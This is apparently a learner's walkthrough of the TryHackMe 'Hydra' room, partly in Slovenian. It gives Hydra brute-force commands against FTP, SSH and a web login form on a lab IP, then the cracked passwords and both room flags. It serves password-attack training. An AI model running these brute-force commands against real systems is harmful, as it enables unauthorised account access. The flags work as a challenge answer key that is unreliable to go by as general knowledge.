# Hydra
link: https://tryhackme.com/room/hydra

## Task 1 Hydra Introduction
Hydra je online brute force password cracking program.
For more information on the options of each protocol in Hydra, read the official Kali Hydra tool page: https://en.kali.tools/?p=220

## Task 2 Using Hydra 

### Hydra Commands

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

- hydra -l user -P passlist.txt ftp://10.10.220.75

### SSH
- hydra -l < username > -P < full path to pass > 10.10.220.75 -t 4 ssh

### Post Web Form

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:

- hydra -l < username > -P < wordlist > 10.10.220.75 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

Use Hydra to bruteforce molly's web password. What is flag 1?
- Uporabil sem: hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.220.75 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
- Dobil geslo: sunshine
- Flag: THM{2673a7dd116de68e85c48ec0b1f2612e}

Use Hydra to bruteforce molly's SSH password. What is flag 2?
- Uporabil: hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.220.75 -t 4 ssh
- Dobil geslo: butterfly
- Pognal ukaz: ssh molly@10.10.220.75 in se vpisal
- Flag: THM{c8eeb0468febbadea859baeb33b2541b}



